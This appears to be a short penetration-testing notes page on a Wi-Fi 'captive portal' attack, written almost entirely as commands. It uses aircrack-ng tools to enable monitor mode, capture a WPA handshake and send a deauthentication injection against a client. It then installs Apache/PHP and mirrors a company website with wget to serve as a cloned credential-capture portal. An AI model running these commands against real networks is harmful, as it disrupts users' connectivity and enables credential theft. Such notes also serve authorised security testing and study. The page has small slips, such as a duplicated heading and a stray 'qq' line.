# Captive Ports


## Commands

## Commands

* Run [reconnaissance](../reconnaissance.md) first

### Capture some data

```bash
# Start monitor mode
sudo airmon-ng start wlan0

# Start a screen session with a horizonal split screen

# Start monitor mode but with filters and output saved to PCAP.
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap wlan0mon

# Do one deauth injection attack while still monitoring
sudo aireplay-ng -0 1 -a $BSSID -c $CLIENT wlan0mon

# Wait for the four-way handshake to appear in airodump-ng window.
# Stop airodump-ng when it appears
qq
```

### Build the Captive Portal

```bash

# Install the dependencies to build our captive port website
sudo apt-get install apache2 libapache2-mod-php

# Use the premade one
wget -r -l2 https://www.megacorpone.com
```


### Set up Network

```bash

sudo ip addr add 192.168.87.1/24 dev wlan0
sudo ip link set wlan0 up

```


## References

* [Wiki](https://en.wikipedia.org/wiki/Captive_portal)